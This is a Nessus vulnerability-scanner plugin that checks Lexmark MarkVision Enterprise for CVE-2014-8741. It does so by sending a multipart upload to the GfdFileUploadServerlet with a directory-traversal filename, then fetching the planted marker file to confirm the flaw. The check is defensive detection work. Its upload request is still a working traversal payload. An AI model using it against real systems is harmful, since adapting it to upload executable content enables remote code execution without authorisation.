#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(80554);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 21:17:11 $");

  script_cve_id("CVE-2014-8741");
  script_bugtraq_id(71623);
  script_osvdb_id(115622);

  script_name(english:"Lexmark MarkVision Enterprise GfdFileUploadServerlet RCE Vulnerability");
  script_summary(english:"Attempts to exploit the vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web application is affected by a remote code execution
vulnerability.");
  script_set_attribute(attribute:"description", value:
"Nessus was able to exploit a directory traversal vulnerability in
Lexmark MarkVision Enterprise, within the 'GfdFileUploadServerlet'
servlet, to upload a file to the remote host. A remote attacker can
utilize this vulnerability to both upload and execute arbitrary code
with SYSTEM privileges.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-14-410/");
  script_set_attribute(attribute:"see_also",value:"http://support.lexmark.com/index?page=content&id=TE666");
  script_set_attribute(attribute:"solution", value:"Upgrade to Lexmark MarkVision Enterprise 2.1.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Lexmark MarkVision Enterprise 2.0 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Lexmark MarkVision Enterprise Arbitrary File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/12/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/12/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/01/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:lexmark:markvision");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("lexmark_markvision_enterprise_detect.nasl");
  script_require_ports("Services/www", 9788);
  script_require_keys("www/lexmark_markvision_enterprise");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

get_install_count(app_name:"lexmark_markvision_enterprise", exit_if_zero:TRUE);
port = get_http_port(default:9788);

install = get_single_install(
  app_name : "lexmark_markvision_enterprise",
  port     : port
);

dir = install['path'];

filename = "/..\..\..\apps\dm-mve\nessus.txt";

r = rand_str();

boundary = "---------------------------nessus";
postdata =
    '--' + boundary + '\r\n' +
    'Content-Disposition: form-data; name="success"\r\n' +
    '\r\nsuccess' + r + ' - $fn\r\n' +
    '--' + boundary + '\r\n' +
    'Content-Disposition: form-data; name="failure"\r\n' +
    '\r\nfailure\r\n' +
    '--' + boundary + '\r\n' +
    'Content-Disposition: form-data; name="datafile"; filename="' + filename + '"\r\n' +
    'Content-Type: text/html\r\n' +
    '\r\ndelete me - ' + r + '\r\n' +
    '--' + boundary + '--\r\n';

res = http_send_recv3(
  method: "POST",
  item: dir + "/upload/gfd",
  port: port,
  add_headers: make_array("Content-Type", "multipart/form-data; boundary=" + boundary),
  data: postdata,
  exit_on_fail: TRUE
);

exploit_req = http_last_sent_request();

# >success - "nessus-1421070914970.txt"<
item = eregmatch(pattern:'>\\s*success' + r + '\\s*-\\s*"([^"]+)"<', string:res[2]);

if(isnull(item))
 audit(AUDIT_WEB_APP_NOT_AFFECTED, "Lexmark MarkVision Enterprise", build_url(qs:dir, port:port));

filename = item[1];

res = http_send_recv3(
  method: "GET",
  item: dir + "/" + filename,
  port: port,
  exit_on_fail: TRUE
);

if("delete me - " + r == res[2])
{
  if(report_verbosity > 0)
  {
    snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue exists with the following ' +
      'request :' +
      '\n' +
      '\n' + build_url(port:port, qs:dir + '/' + filename) +
      '\n' +
      '\nNote: This file has not been removed by Nessus and will need to'+
      '\nbe manually deleted.' +
      '\n';
    if (report_verbosity > 1)
    {
      report += '\nThis file was created using the following request :'+
        '\n' +
        '\n' + snip +
        '\n' + exploit_req +
        '\n' + snip +
        '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "Lexmark MarkVision Enterprise", build_url(qs:dir, port:port));
